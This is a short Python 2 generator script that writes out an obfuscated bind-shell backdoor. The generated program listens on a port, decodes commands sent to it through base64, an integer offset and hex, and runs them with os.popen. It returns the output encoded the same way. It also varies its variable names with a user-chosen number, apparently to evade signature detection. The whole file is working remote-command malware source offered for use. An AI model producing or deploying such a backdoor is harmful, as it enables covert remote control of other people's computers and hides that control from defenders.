#programed by Majid AL Maashari
#Email : omanras@gmail.com



file_name = raw_input("Enter file name: ")
bind_port = raw_input("Enter port number: ")
random = raw_input("Enter random number: ")


data = """
import subprocess
import socket
import sys
import os
import base64
from base64 import b64encode, b64decode

host = "127.0.0.1" #! address to bind on.
port = int("""+bind_port+""")
random = int("""+random+""")





while True:
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.bind((host,port))
		s.listen(4)
		while True:
			c,addr=s.accept()
			
	 
			for tym in range(0,50):
				data=c.recv(1024)

				
				cipher"""+random+""" = b64decode(data)
				cipher"""+random+""" = int(cipher"""+random+""") - random
				dechex"""+random+"""= '{0:x}'.format(int(cipher"""+random+"""))
				try :
					hexdecode"""+random+""" = dechex"""+random+""".decode('hex')
				except:
					hexdecode"""+random+""" = bytes.fromhex(dechex"""+random+""")
					hexdecode"""+random+""" = str(hexdecode"""+random+""")[1:]
					
		
		
				a = ""
				for line in os.popen(hexdecode"""+random+"""):
					
					a = a + line
					
				try :
					hexcode"""+random+"""= a.encode('hex')
				except:
					hexcode"""+random+"""= a.encode().hex()

				hexdec"""+random+""" = int(hexcode"""+random+""", 16)
				encoded_cipher = hexdec"""+random+""" + random
				try:
					encode = b64encode(str(encoded_cipher))
				except:
					encode = base64.b64encode(str(encoded_cipher).encode())	
				c.send(encode)
	except KeyboardInterrupt:
		c.send("[ctrl+c] server forcely closed.")
		s.close()
		sys.exit(1)
"""


f = open(file_name, "w")
f.write(data)
f.close()

print "Done!!"
	



